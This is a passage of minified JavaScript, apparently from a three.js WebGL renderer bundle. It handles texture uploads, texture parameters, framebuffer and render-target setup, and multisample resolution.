b=i.get(R);if(R.depthTexture&&(R.depthTexture.dispose(),i.remove(R.depthTexture)),R.isWebGLCubeRenderTarget)for(let Q=0;Q<6;Q++){if(Array.isArray(b.__webglFramebuffer[Q]))for(let te=0;te<b.__webglFramebuffer[Q].length;te++)t.deleteFramebuffer(b.__webglFramebuffer[Q][te]);else t.deleteFramebuffer(b.__webglFramebuffer[Q]);b.__webglDepthbuffer&&t.deleteRenderbuffer(b.__webglDepthbuffer[Q])}else{if(Array.isArray(b.__webglFramebuffer))for(let Q=0;Q<b.__webglFramebuffer.length;Q++)t.deleteFramebuffer(b.__webglFramebuffer[Q]);else t.deleteFramebuffer(b.__webglFramebuffer);if(b.__webglDepthbuffer&&t.deleteRenderbuffer(b.__webglDepthbuffer),b.__webglMultisampledFramebuffer&&t.deleteFramebuffer(b.__webglMultisampledFramebuffer),b.__webglColorRenderbuffer)for(let Q=0;Q<b.__webglColorRenderbuffer.length;Q++)b.__webglColorRenderbuffer[Q]&&t.deleteRenderbuffer(b.__webglColorRenderbuffer[Q]);b.__webglDepthRenderbuffer&&t.deleteRenderbuffer(b.__webglDepthRenderbuffer)}const U=R.textures;for(let Q=0,te=U.length;Q<te;Q++){const K=i.get(U[Q]);K.__webglTexture&&(t.deleteTexture(K.__webglTexture),a.memory.textures--),i.remove(U[Q])}i.remove(R)}let k=0;function H(){k=0}function V(){const R=k;return R>=s.maxTextures&&Ie("WebGLTextures: Trying to use "+R+" texture units while this GPU supports only "+s.maxTextures),k+=1,R}function W(R){const b=[];return b.push(R.wrapS),b.push(R.wrapT),b.push(R.wrapR||0),b.push(R.magFilter),b.push(R.minFilter),b.push(R.anisotropy),b.push(R.internalFormat),b.push(R.format),b.push(R.type),b.push(R.generateMipmaps),b.push(R.premultiplyAlpha),b.push(R.flipY),b.push(R.unpackAlignment),b.push(R.colorSpace),b.join()}function j(R,b){const U=i.get(R);if(R.isVideoTexture&&Qe(R),R.isRenderTargetTexture===!1&&R.isExternalTexture!==!0&&R.version>0&&U.__version!==R.version){const Q=R.image;if(Q===null)Ie("WebGLRenderer: Texture marked for update but no image data found.");else if(Q.complete===!1)Ie("WebGLRenderer: Texture marked for update but image is incomplete");else{Z(U,R,b);return}}else R.isExternalTexture&&(U.__webglTexture=R.sourceTexture?R.sourceTexture:null);n.bindTexture(t.TEXTURE_2D,U.__webglTexture,t.TEXTURE0+b)}function X(R,b){const U=i.get(R);if(R.isRenderTargetTexture===!1&&R.version>0&&U.__version!==R.version){Z(U,R,b);return}else R.isExternalTexture&&(U.__webglTexture=R.sourceTexture?R.sourceTexture:null);n.bindTexture(t.TEXTURE_2D_ARRAY,U.__webglTexture,t.TEXTURE0+b)}function D(R,b){const U=i.get(R);if(R.isRenderTargetTexture===!1&&R.version>0&&U.__version!==R.version){Z(U,R,b);return}n.bindTexture(t.TEXTURE_3D,U.__webglTexture,t.TEXTURE0+b)}function N(R,b){const U=i.get(R);if(R.isCubeDepthTexture!==!0&&R.version>0&&U.__version!==R.version){ne(U,R,b);return}n.bindTexture(t.TEXTURE_CUBE_MAP,U.__webglTexture,t.TEXTURE0+b)}const O={[ja]:t.REPEAT,[Ti]:t.CLAMP_TO_EDGE,[Nd]:t.MIRRORED_REPEAT},B={[Bt]:t.NEAREST,[kw]:t.NEAREST_MIPMAP_NEAREST,[ko]:t.NEAREST_MIPMAP_LINEAR,[qt]:t.LINEAR,[qc]:t.LINEAR_MIPMAP_NEAREST,[Ps]:t.LINEAR_MIPMAP_LINEAR},J={[Nw]:t.NEVER,[Fw]:t.ALWAYS,[Iw]:t.LESS,[xp]:t.LEQUAL,[Dw]:t.EQUAL,[_p]:t.GEQUAL,[Uw]:t.GREATER,[Ow]:t.NOTEQUAL};function oe(R,b){if(b.type===si&&e.has("OES_texture_float_linear")===!1&&(b.magFilter===qt||b.magFilter===qc||b.magFilter===ko||b.magFilter===Ps||b.minFilter===qt||b.minFilter===qc||b.minFilter===ko||b.minFilter===Ps)&&Ie("WebGLRenderer: Unable to use linear filtering with floating point textures. OES_texture_float_linear not supported on this device."),t.texParameteri(R,t.TEXTURE_WRAP_S,O[b.wrapS]),t.texParameteri(R,t.TEXTURE_WRAP_T,O[b.wrapT]),(R===t.TEXTURE_3D||R===t.TEXTURE_2D_ARRAY)&&t.texParameteri(R,t.TEXTURE_WRAP_R,O[b.wrapR]),t.texParameteri(R,t.TEXTURE_MAG_FILTER,B[b.magFilter]),t.texParameteri(R,t.TEXTURE_MIN_FILTER,B[b.minFilter]),b.compareFunction&&(t.texParameteri(R,t.TEXTURE_COMPARE_MODE,t.COMPARE_REF_TO_TEXTURE),t.texParameteri(R,t.TEXTURE_COMPARE_FUNC,J[b.compareFunction])),e.has("EXT_texture_filter_anisotropic")===!0){if(b.magFilter===Bt||b.minFilter!==ko&&b.minFilter!==Ps||b.type===si&&e.has("OES_texture_float_linear")===!1)return;if(b.anisotropy>1||i.get(b).__currentAnisotropy){const U=e.get("EXT_texture_filter_anisotropic");t.texParameterf(R,U.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(b.anisotropy,s.getMaxAnisotropy())),i.get(b).__currentAnisotropy=b.anisotropy}}}function ge(R,b){let U=!1;R.__webglInit===void 0&&(R.__webglInit=!0,b.addEventListener("dispose",A));const Q=b.source;let te=p.get(Q);te===void 0&&(te={},p.set(Q,te));const K=W(b);if(K!==R.__cacheKey){te[K]===void 0&&(te[K]={texture:t.createTexture(),usedTimes:0},a.memory.textures++,U=!0),te[K].usedTimes++;const Ae=te[R.__cacheKey];Ae!==void 0&&(te[R.__cacheKey].usedTimes--,Ae.usedTimes===0&&w(b)),R.__cacheKey=K,R.__webglTexture=te[K].texture}return U}function ze(R,b,U){return Math.floor(Math.floor(R/U)/b)}function Ye(R,b,U,Q){const K=R.updateRanges;if(K.length===0)n.texSubImage2D(t.TEXTURE_2D,0,0,0,b.width,b.height,U,Q,b.data);else{K.sort((re,de)=>re.start-de.start);let Ae=0;for(let re=1;re<K.length;re++){const de=K[Ae],Se=K[re],Te=de.start+de.count,ue=ze(Se.start,b.width,4),Be=ze(de.start,b.width,4);Se.start<=Te+1&&ue===Be&&ze(Se.start+Se.count-1,b.width,4)===ue?de.count=Math.max(de.count,Se.start+Se.count-de.start):(++Ae,K[Ae]=Se)}K.length=Ae+1;const ce=t.getParameter(t.UNPACK_ROW_LENGTH),Me=t.getParameter(t.UNPACK_SKIP_PIXELS),Pe=t.getParameter(t.UNPACK_SKIP_ROWS);t.pixelStorei(t.UNPACK_ROW_LENGTH,b.width);for(let re=0,de=K.length;re<de;re++){const Se=K[re],Te=Math.floor(Se.start/4),ue=Math.ceil(Se.count/4),Be=Te%b.width,I=Math.floor(Te/b.width),me=ue,ae=1;t.pixelStorei(t.UNPACK_SKIP_PIXELS,Be),t.pixelStorei(t.UNPACK_SKIP_ROWS,I),n.texSubImage2D(t.TEXTURE_2D,0,Be,I,me,ae,U,Q,b.data)}R.clearUpdateRanges(),t.pixelStorei(t.UNPACK_ROW_LENGTH,ce),t.pixelStorei(t.UNPACK_SKIP_PIXELS,Me),t.pixelStorei(t.UNPACK_SKIP_ROWS,Pe)}}function Z(R,b,U){let Q=t.TEXTURE_2D;(b.isDataArrayTexture||b.isCompressedArrayTexture)&&(Q=t.TEXTURE_2D_ARRAY),b.isData3DTexture&&(Q=t.TEXTURE_3D);const te=ge(R,b),K=b.source;n.bindTexture(Q,R.__webglTexture,t.TEXTURE0+U);const Ae=i.get(K);if(K.version!==Ae.__version||te===!0){n.activeTexture(t.TEXTURE0+U);const ce=je.getPrimaries(je.workingColorSpace),Me=b.colorSpace===$i?null:je.getPrimaries(b.colorSpace),Pe=b.colorSpace===$i||ce===Me?t.NONE:t.BROWSER_DEFAULT_WEBGL;t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL,b.flipY),t.pixelStorei(t.UNPACK_PREMULTIPLY_ALPHA_WEBGL,b.premultiplyAlpha),t.pixelStorei(t.UNPACK_ALIGNMENT,b.unpackAlignment),t.pixelStorei(t.UNPACK_COLORSPACE_CONVERSION_WEBGL,Pe);let re=_(b.image,!1,s.maxTextureSize);re=lt(b,re);const de=r.convert(b.format,b.colorSpace),Se=r.convert(b.type);let Te=x(b.internalFormat,de,Se,b.colorSpace,b.isVideoTexture);oe(Q,b);let ue;const Be=b.mipmaps,I=b.isVideoTexture!==!0,me=Ae.__version===void 0||te===!0,ae=K.dataReady,ve=E(b,re);if(b.isDepthTexture)Te=S(b.format===Ns,b.type),me&&(I?n.texStorage2D(t.TEXTURE_2D,1,Te,re.width,re.height):n.texImage2D(t.TEXTURE_2D,0,Te,re.width,re.height,0,de,Se,null));else if(b.isDataTexture)if(Be.length>0){I&&me&&n.texStorage2D(t.TEXTURE_2D,ve,Te,Be[0].width,Be[0].height);for(let ie=0,ee=Be.length;ie<ee;ie++)ue=Be[ie],I?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,ue.width,ue.height,de,Se,ue.data):n.texImage2D(t.TEXTURE_2D,ie,Te,ue.width,ue.height,0,de,Se,ue.data);b.generateMipmaps=!1}else I?(me&&n.texStorage2D(t.TEXTURE_2D,ve,Te,re.width,re.height),ae&&Ye(b,re,de,Se)):n.texImage2D(t.TEXTURE_2D,0,Te,re.width,re.height,0,de,Se,re.data);else if(b.isCompressedTexture)if(b.isCompressedArrayTexture){I&&me&&n.texStorage3D(t.TEXTURE_2D_ARRAY,ve,Te,Be[0].width,Be[0].height,re.depth);for(let ie=0,ee=Be.length;ie<ee;ie++)if(ue=Be[ie],b.format!==qn)if(de!==null)if(I){if(ae)if(b.layerUpdates.size>0){const le=Um(ue.width,ue.height,b.format,b.type);for(const Ne of b.layerUpdates){const ct=ue.data.subarray(Ne*le/ue.data.BYTES_PER_ELEMENT,(Ne+1)*le/ue.data.BYTES_PER_ELEMENT);n.compressedTexSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,Ne,ue.width,ue.height,1,de,ct)}b.clearLayerUpdates()}else n.compressedTexSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,0,ue.width,ue.height,re.depth,de,ue.data)}else n.compressedTexImage3D(t.TEXTURE_2D_ARRAY,ie,Te,ue.width,ue.height,re.depth,0,ue.data,0,0);else Ie("WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()");else I?ae&&n.texSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,0,ue.width,ue.height,re.depth,de,Se,ue.data):n.texImage3D(t.TEXTURE_2D_ARRAY,ie,Te,ue.width,ue.height,re.depth,0,de,Se,ue.data)}else{I&&me&&n.texStorage2D(t.TEXTURE_2D,ve,Te,Be[0].width,Be[0].height);for(let ie=0,ee=Be.length;ie<ee;ie++)ue=Be[ie],b.format!==qn?de!==null?I?ae&&n.compressedTexSubImage2D(t.TEXTURE_2D,ie,0,0,ue.width,ue.height,de,ue.data):n.compressedTexImage2D(t.TEXTURE_2D,ie,Te,ue.width,ue.height,0,ue.data):Ie("WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):I?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,ue.width,ue.height,de,Se,ue.data):n.texImage2D(t.TEXTURE_2D,ie,Te,ue.width,ue.height,0,de,Se,ue.data)}else if(b.isDataArrayTexture)if(I){if(me&&n.texStorage3D(t.TEXTURE_2D_ARRAY,ve,Te,re.width,re.height,re.depth),ae)if(b.layerUpdates.size>0){const ie=Um(re.width,re.height,b.format,b.type);for(const ee of b.layerUpdates){const le=re.data.subarray(ee*ie/re.data.BYTES_PER_ELEMENT,(ee+1)*ie/re.data.BYTES_PER_ELEMENT);n.texSubImage3D(t.TEXTURE_2D_ARRAY,0,0,0,ee,re.width,re.height,1,de,Se,le)}b.clearLayerUpdates()}else n.texSubImage3D(t.TEXTURE_2D_ARRAY,0,0,0,0,re.width,re.height,re.depth,de,Se,re.data)}else n.texImage3D(t.TEXTURE_2D_ARRAY,0,Te,re.width,re.height,re.depth,0,de,Se,re.data);else if(b.isData3DTexture)I?(me&&n.texStorage3D(t.TEXTURE_3D,ve,Te,re.width,re.height,re.depth),ae&&n.texSubImage3D(t.TEXTURE_3D,0,0,0,0,re.width,re.height,re.depth,de,Se,re.data)):n.texImage3D(t.TEXTURE_3D,0,Te,re.width,re.height,re.depth,0,de,Se,re.data);else if(b.isFramebufferTexture){if(me)if(I)n.texStorage2D(t.TEXTURE_2D,ve,Te,re.width,re.height);else{let ie=re.width,ee=re.height;for(let le=0;le<ve;le++)n.texImage2D(t.TEXTURE_2D,le,Te,ie,ee,0,de,Se,null),ie>>=1,ee>>=1}}else if(Be.length>0){if(I&&me){const ie=Ee(Be[0]);n.texStorage2D(t.TEXTURE_2D,ve,Te,ie.width,ie.height)}for(let ie=0,ee=Be.length;ie<ee;ie++)ue=Be[ie],I?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,de,Se,ue):n.texImage2D(t.TEXTURE_2D,ie,Te,de,Se,ue);b.generateMipmaps=!1}else if(I){if(me){const ie=Ee(re);n.texStorage2D(t.TEXTURE_2D,ve,Te,ie.width,ie.height)}ae&&n.texSubImage2D(t.TEXTURE_2D,0,0,0,de,Se,re)}else n.texImage2D(t.TEXTURE_2D,0,Te,de,Se,re);g(b)&&u(Q),Ae.__version=K.version,b.onUpdate&&b.onUpdate(b)}R.__version=b.version}function ne(R,b,U){if(b.image.length!==6)return;const Q=ge(R,b),te=b.source;n.bindTexture(t.TEXTURE_CUBE_MAP,R.__webglTexture,t.TEXTURE0+U);const K=i.get(te);if(te.version!==K.__version||Q===!0){n.activeTexture(t.TEXTURE0+U);const Ae=je.getPrimaries(je.workingColorSpace),ce=b.colorSpace===$i?null:je.getPrimaries(b.colorSpace),Me=b.colorSpace===$i||Ae===ce?t.NONE:t.BROWSER_DEFAULT_WEBGL;t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL,b.flipY),t.pixelStorei(t.UNPACK_PREMULTIPLY_ALPHA_WEBGL,b.premultiplyAlpha),t.pixelStorei(t.UNPACK_ALIGNMENT,b.unpackAlignment),t.pixelStorei(t.UNPACK_COLORSPACE_CONVERSION_WEBGL,Me);const Pe=b.isCompressedTexture||b.image[0].isCompressedTexture,re=b.image[0]&&b.image[0].isDataTexture,de=[];for(let ee=0;ee<6;ee++)!Pe&&!re?de[ee]=_(b.image[ee],!0,s.maxCubemapSize):de[ee]=re?b.image[ee].image:b.image[ee],de[ee]=lt(b,de[ee]);const Se=de[0],Te=r.convert(b.format,b.colorSpace),ue=r.convert(b.type),Be=x(b.internalFormat,Te,ue,b.colorSpace),I=b.isVideoTexture!==!0,me=K.__version===void 0||Q===!0,ae=te.dataReady;let ve=E(b,Se);oe(t.TEXTURE_CUBE_MAP,b);let ie;if(Pe){I&&me&&n.texStorage2D(t.TEXTURE_CUBE_MAP,ve,Be,Se.width,Se.height);for(let ee=0;ee<6;ee++){ie=de[ee].mipmaps;for(let le=0;le<ie.length;le++){const Ne=ie[le];b.format!==qn?Te!==null?I?ae&&n.compressedTexSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,le,0,0,Ne.width,Ne.height,Te,Ne.data):n.compressedTexImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,le,Be,Ne.width,Ne.height,0,Ne.data):Ie("WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()"):I?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,le,0,0,Ne.width,Ne.height,Te,ue,Ne.data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,le,Be,Ne.width,Ne.height,0,Te,ue,Ne.data)}}}else{if(ie=b.mipmaps,I&&me){ie.length>0&&ve++;const ee=Ee(de[0]);n.texStorage2D(t.TEXTURE_CUBE_MAP,ve,Be,ee.width,ee.height)}for(let ee=0;ee<6;ee++)if(re){I?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,0,0,0,de[ee].width,de[ee].height,Te,ue,de[ee].data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,0,Be,de[ee].width,de[ee].height,0,Te,ue,de[ee].data);for(let le=0;le<ie.length;le++){const ct=ie[le].image[ee].image;I?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,le+1,0,0,ct.width,ct.height,Te,ue,ct.data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,le+1,Be,ct.width,ct.height,0,Te,ue,ct.data)}}else{I?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,0,0,0,Te,ue,de[ee]):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,0,Be,Te,ue,de[ee]);for(let le=0;le<ie.length;le++){const Ne=ie[le];I?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,le+1,0,0,Te,ue,Ne.image[ee]):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+ee,le+1,Be,Te,ue,Ne.image[ee])}}}g(b)&&u(t.TEXTURE_CUBE_MAP),K.__version=te.version,b.onUpdate&&b.onUpdate(b)}R.__version=b.version}function _e(R,b,U,Q,te,K){const Ae=r.convert(U.format,U.colorSpace),ce=r.convert(U.type),Me=x(U.internalFormat,Ae,ce,U.colorSpace),Pe=i.get(b),re=i.get(U);if(re.__renderTarget=b,!Pe.__hasExternalTextures){const de=Math.max(1,b.width>>K),Se=Math.max(1,b.height>>K);te===t.TEXTURE_3D||te===t.TEXTURE_2D_ARRAY?n.texImage3D(te,K,Me,de,Se,b.depth,0,Ae,ce,null):n.texImage2D(te,K,Me,de,Se,0,Ae,ce,null)}n.bindFramebuffer(t.FRAMEBUFFER,R),Et(b)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,Q,te,re.__webglTexture,0,P(b)):(te===t.TEXTURE_2D||te>=t.TEXTURE_CUBE_MAP_POSITIVE_X&&te<=t.TEXTURE_CUBE_MAP_NEGATIVE_Z)&&t.framebufferTexture2D(t.FRAMEBUFFER,Q,te,re.__webglTexture,K),n.bindFramebuffer(t.FRAMEBUFFER,null)}function De(R,b,U){if(t.bindRenderbuffer(t.RENDERBUFFER,R),b.depthBuffer){const Q=b.depthTexture,te=Q&&Q.isDepthTexture?Q.type:null,K=S(b.stencilBuffer,te),Ae=b.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;Et(b)?o.renderbufferStorageMultisampleEXT(t.RENDERBUFFER,P(b),K,b.width,b.height):U?t.renderbufferStorageMultisample(t.RENDERBUFFER,P(b),K,b.width,b.height):t.renderbufferStorage(t.RENDERBUFFER,K,b.width,b.height),t.framebufferRenderbuffer(t.FRAMEBUFFER,Ae,t.RENDERBUFFER,R)}else{const Q=b.textures;for(let te=0;te<Q.length;te++){const K=Q[te],Ae=r.convert(K.format,K.colorSpace),ce=r.convert(K.type),Me=x(K.internalFormat,Ae,ce,K.colorSpace);Et(b)?o.renderbufferStorageMultisampleEXT(t.RENDERBUFFER,P(b),Me,b.width,b.height):U?t.renderbufferStorageMultisample(t.RENDERBUFFER,P(b),Me,b.width,b.height):t.renderbufferStorage(t.RENDERBUFFER,Me,b.width,b.height)}}t.bindRenderbuffer(t.RENDERBUFFER,null)}function we(R,b,U){const Q=b.isWebGLCubeRenderTarget===!0;if(n.bindFramebuffer(t.FRAMEBUFFER,R),!(b.depthTexture&&b.depthTexture.isDepthTexture))throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");const te=i.get(b.depthTexture);if(te.__renderTarget=b,(!te.__webglTexture||b.depthTexture.image.width!==b.width||b.depthTexture.image.height!==b.height)&&(b.depthTexture.image.width=b.width,b.depthTexture.image.height=b.height,b.depthTexture.needsUpdate=!0),Q){if(te.__webglInit===void 0&&(te.__webglInit=!0,b.depthTexture.addEventListener("dispose",A)),te.__webglTexture===void 0){te.__webglTexture=t.createTexture(),n.bindTexture(t.TEXTURE_CUBE_MAP,te.__webglTexture),oe(t.TEXTURE_CUBE_MAP,b.depthTexture);const Pe=r.convert(b.depthTexture.format),re=r.convert(b.depthTexture.type);let de;b.depthTexture.format===Di?de=t.DEPTH_COMPONENT24:b.depthTexture.format===Ns&&(de=t.DEPTH24_STENCIL8);for(let Se=0;Se<6;Se++)t.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+Se,0,de,b.width,b.height,0,Pe,re,null)}}else j(b.depthTexture,0);const K=te.__webglTexture,Ae=P(b),ce=Q?t.TEXTURE_CUBE_MAP_POSITIVE_X+U:t.TEXTURE_2D,Me=b.depthTexture.format===Ns?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;if(b.depthTexture.format===Di)Et(b)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,Me,ce,K,0,Ae):t.framebufferTexture2D(t.FRAMEBUFFER,Me,ce,K,0);else if(b.depthTexture.format===Ns)Et(b)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,Me,ce,K,0,Ae):t.framebufferTexture2D(t.FRAMEBUFFER,Me,ce,K,0);else throw new Error("Unknown depthTexture format")}function $e(R){const b=i.get(R),U=R.isWebGLCubeRenderTarget===!0;if(b.__boundDepthTexture!==R.depthTexture){const Q=R.depthTexture;if(b.__depthDisposeCallback&&b.__depthDisposeCallback(),Q){const te=()=>{delete b.__boundDepthTexture,delete b.__depthDisposeCallback,Q.removeEventListener("dispose",te)};Q.addEventListener("dispose",te),b.__depthDisposeCallback=te}b.__boundDepthTexture=Q}if(R.depthTexture&&!b.__autoAllocateDepthBuffer)if(U)for(let Q=0;Q<6;Q++)we(b.__webglFramebuffer[Q],R,Q);else{const Q=R.texture.mipmaps;Q&&Q.length>0?we(b.__webglFramebuffer[0],R,0):we(b.__webglFramebuffer,R,0)}else if(U){b.__webglDepthbuffer=[];for(let Q=0;Q<6;Q++)if(n.bindFramebuffer(t.FRAMEBUFFER,b.__webglFramebuffer[Q]),b.__webglDepthbuffer[Q]===void 0)b.__webglDepthbuffer[Q]=t.createRenderbuffer(),De(b.__webglDepthbuffer[Q],R,!1);else{const te=R.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,K=b.__webglDepthbuffer[Q];t.bindRenderbuffer(t.RENDERBUFFER,K),t.framebufferRenderbuffer(t.FRAMEBUFFER,te,t.RENDERBUFFER,K)}}else{const Q=R.texture.mipmaps;if(Q&&Q.length>0?n.bindFramebuffer(t.FRAMEBUFFER,b.__webglFramebuffer[0]):n.bindFramebuffer(t.FRAMEBUFFER,b.__webglFramebuffer),b.__webglDepthbuffer===void 0)b.__webglDepthbuffer=t.createRenderbuffer(),De(b.__webglDepthbuffer,R,!1);else{const te=R.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,K=b.__webglDepthbuffer;t.bindRenderbuffer(t.RENDERBUFFER,K),t.framebufferRenderbuffer(t.FRAMEBUFFER,te,t.RENDERBUFFER,K)}}n.bindFramebuffer(t.FRAMEBUFFER,null)}function Nt(R,b,U){const Q=i.get(R);b!==void 0&&_e(Q.__webglFramebuffer,R,R.texture,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,0),U!==void 0&&$e(R)}function We(R){const b=R.texture,U=i.get(R),Q=i.get(b);R.addEventListener("dispose",C);const te=R.textures,K=R.isWebGLCubeRenderTarget===!0,Ae=te.length>1;if(Ae||(Q.__webglTexture===void 0&&(Q.__webglTexture=t.createTexture()),Q.__version=b.version,a.memory.textures++),K){U.__webglFramebuffer=[];for(let ce=0;ce<6;ce++)if(b.mipmaps&&b.mipmaps.length>0){U.__webglFramebuffer[ce]=[];for(let Me=0;Me<b.mipmaps.length;Me++)U.__webglFramebuffer[ce][Me]=t.createFramebuffer()}else U.__webglFramebuffer[ce]=t.createFramebuffer()}else{if(b.mipmaps&&b.mipmaps.length>0){U.__webglFramebuffer=[];for(let ce=0;ce<b.mipmaps.length;ce++)U.__webglFramebuffer[ce]=t.createFramebuffer()}else U.__webglFramebuffer=t.createFramebuffer();if(Ae)for(let ce=0,Me=te.length;ce<Me;ce++){const Pe=i.get(te[ce]);Pe.__webglTexture===void 0&&(Pe.__webglTexture=t.createTexture(),a.memory.textures++)}if(R.samples>0&&Et(R)===!1){U.__webglMultisampledFramebuffer=t.createFramebuffer(),U.__webglColorRenderbuffer=[],n.bindFramebuffer(t.FRAMEBUFFER,U.__webglMultisampledFramebuffer);for(let ce=0;ce<te.length;ce++){const Me=te[ce];U.__webglColorRenderbuffer[ce]=t.createRenderbuffer(),t.bindRenderbuffer(t.RENDERBUFFER,U.__webglColorRenderbuffer[ce]);const Pe=r.convert(Me.format,Me.colorSpace),re=r.convert(Me.type),de=x(Me.internalFormat,Pe,re,Me.colorSpace,R.isXRRenderTarget===!0),Se=P(R);t.renderbufferStorageMultisample(t.RENDERBUFFER,Se,de,R.width,R.height),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+ce,t.RENDERBUFFER,U.__webglColorRenderbuffer[ce])}t.bindRenderbuffer(t.RENDERBUFFER,null),R.depthBuffer&&(U.__webglDepthRenderbuffer=t.createRenderbuffer(),De(U.__webglDepthRenderbuffer,R,!0)),n.bindFramebuffer(t.FRAMEBUFFER,null)}}if(K){n.bindTexture(t.TEXTURE_CUBE_MAP,Q.__webglTexture),oe(t.TEXTURE_CUBE_MAP,b);for(let ce=0;ce<6;ce++)if(b.mipmaps&&b.mipmaps.length>0)for(let Me=0;Me<b.mipmaps.length;Me++)_e(U.__webglFramebuffer[ce][Me],R,b,t.COLOR_ATTACHMENT0,t.TEXTURE_CUBE_MAP_POSITIVE_X+ce,Me);else _e(U.__webglFramebuffer[ce],R,b,t.COLOR_ATTACHMENT0,t.TEXTURE_CUBE_MAP_POSITIVE_X+ce,0);g(b)&&u(t.TEXTURE_CUBE_MAP),n.unbindTexture()}else if(Ae){for(let ce=0,Me=te.length;ce<Me;ce++){const Pe=te[ce],re=i.get(Pe);let de=t.TEXTURE_2D;(R.isWebGL3DRenderTarget||R.isWebGLArrayRenderTarget)&&(de=R.isWebGL3DRenderTarget?t.TEXTURE_3D:t.TEXTURE_2D_ARRAY),n.bindTexture(de,re.__webglTexture),oe(de,Pe),_e(U.__webglFramebuffer,R,Pe,t.COLOR_ATTACHMENT0+ce,de,0),g(Pe)&&u(de)}n.unbindTexture()}else{let ce=t.TEXTURE_2D;if((R.isWebGL3DRenderTarget||R.isWebGLArrayRenderTarget)&&(ce=R.isWebGL3DRenderTarget?t.TEXTURE_3D:t.TEXTURE_2D_ARRAY),n.bindTexture(ce,Q.__webglTexture),oe(ce,b),b.mipmaps&&b.mipmaps.length>0)for(let Me=0;Me<b.mipmaps.length;Me++)_e(U.__webglFramebuffer[Me],R,b,t.COLOR_ATTACHMENT0,ce,Me);else _e(U.__webglFramebuffer,R,b,t.COLOR_ATTACHMENT0,ce,0);g(b)&&u(ce),n.unbindTexture()}R.depthBuffer&&$e(R)}function et(R){const b=R.textures;for(let U=0,Q=b.length;U<Q;U++){const te=b[U];if(g(te)){const K=v(R),Ae=i.get(te).__webglTexture;n.bindTexture(K,Ae),u(K),n.unbindTexture()}}}const at=[],Fe=[];function Mt(R){if(R.samples>0){if(Et(R)===!1){const b=R.textures,U=R.width,Q=R.height;let te=t.COLOR_BUFFER_BIT;const K=R.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,Ae=i.get(R),ce=b.length>1;if(ce)for(let Pe=0;Pe<b.length;Pe++)n.bindFramebuffer(t.FRAMEBUFFER,Ae.__webglMultisampledFramebuffer),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+Pe,t.RENDERBUFFER,null),n.bindFramebuffer(t.FRAMEBUFFER,Ae.__webglFramebuffer),t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0+Pe,t.TEXTURE_2D,null,0);n.bindFramebuffer(t.READ_FRAMEBUFFER,Ae.__webglMultisampledFramebuffer);const Me=R.texture.mipmaps;Me&&Me.length>0?n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Ae.__webglFramebuffer[0]):n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Ae.__webglFramebuffer);for(let Pe=0;Pe<b.length;Pe++){if(R.resolveDepthBuffer&&(R.depthBuffer&&(te|=t.DEPTH_BUFFER_BIT),R.stencilBuffer&&R.resolveStencilBuffer&&(te|=t.STENCIL_BUFFER_BIT)),ce){t.framebufferRenderbuffer(t.READ_FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.RENDERBUFFER,Ae.__webglColorRenderbuffer[Pe]);const re=i.get(b[Pe]).__webglTexture;t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,re,0)}t.blitFramebuffer(0,0,U,Q,0,0,U,Q,te,t.NEAREST),l===!0&&(at.length=0,Fe.length=0,at.push(t.COLOR_ATTACHMENT0+Pe),R.depthBuffer&&R.resolveDepthBuffer===!1&&(at.push(K),Fe.push(K),t.invalidateFramebuffer(t.DRAW_FRAMEBUFFER,Fe)),t.invalidateFramebuffer(t.READ_FRAMEBUFFER,at))}if(n.bindFramebuffer(t.READ_FRAMEBUFFER,null),n.bindFramebuffer(t.DRAW_FRAMEBUFFER,null),ce)for(let 